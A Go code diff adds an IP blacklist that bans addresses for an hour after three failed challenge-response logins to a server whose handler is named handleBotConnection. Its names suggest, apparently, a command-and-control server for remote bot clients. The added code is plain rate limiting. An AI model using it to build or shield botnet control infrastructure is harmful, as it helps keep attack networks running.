@@ -14,8 +14,65 @@ import (
 	"net/http"
 	"os"
 	"strings"
+	"sync"
 	"time"
 )
+
+// ============================================================================
+// IP BLACKLIST — auto-ban IPs that repeatedly fail authentication
+// ============================================================================
+
+const (
+	authFailThreshold = 3         // consecutive failures before ban
+	banDuration       = time.Hour // how long a ban lasts
+)
+
+var (
+	ipFailsMu sync.Mutex
+	ipFails   = map[string]int{}
+	ipBansMu  sync.RWMutex
+	ipBans    = map[string]time.Time{}
+)
+
+func connIP(conn net.Conn) string {
+	host, _, err := net.SplitHostPort(conn.RemoteAddr().String())
+	if err != nil {
+		return conn.RemoteAddr().String()
+	}
+	return host
+}
+
+func isBanned(ip string) bool {
+	ipBansMu.RLock()
+	expiry, ok := ipBans[ip]
+	ipBansMu.RUnlock()
+	if !ok {
+		return false
+	}
+	if time.Now().After(expiry) {
+		ipBansMu.Lock()
+		delete(ipBans, ip)
+		ipBansMu.Unlock()
+		ipFailsMu.Lock()
+		delete(ipFails, ip)
+		ipFailsMu.Unlock()
+		return false
+	}
+	return true
+}
+
+func recordAuthFailure(ip string) {
+	ipFailsMu.Lock()
+	ipFails[ip]++
+	count := ipFails[ip]
+	ipFailsMu.Unlock()
+	if count >= authFailThreshold {
+		ipBansMu.Lock()
+		ipBans[ip] = time.Now().Add(banDuration)
+		ipBansMu.Unlock()
+		logMsg("[BLACKLIST] %s banned for 1h after %d consecutive auth failures", ip, count)
+	}
+}
 
 // ============================================================================
 // TLS CONFIGURATION
@@ -99,6 +156,12 @@ func validateTLSHandshake(conn net.Conn) {
 			conn.Close()
 		}
 	}()
+
+	// Drop banned IPs immediately — no handshake, no log noise
+	if isBanned(connIP(conn)) {
+		conn.Close()
+		return
+	}
 
 	// Type assert to TLS connection
 	tlsConn, ok := conn.(*tls.Conn)
@@ -429,12 +492,14 @@ func handleBotConnection(conn net.Conn) {
 	// Step 3: Verify response
 	expectedResponse := generateAuthResponse(challenge, MAGIC_CODE)
 	if authResponse != expectedResponse {
+		ip := connIP(conn)
 		logMsg("[AUTH] Invalid auth from %s. Got: %s... Expected: %s...",
 			conn.RemoteAddr(),
 			safeSubstring(authResponse, 0, 10),
 			safeSubstring(expectedResponse, 0, 10))
 		writer.WriteString("AUTH_FAILED\n")
 		writer.Flush()
+		recordAuthFailure(ip)
 		return
 	}
 
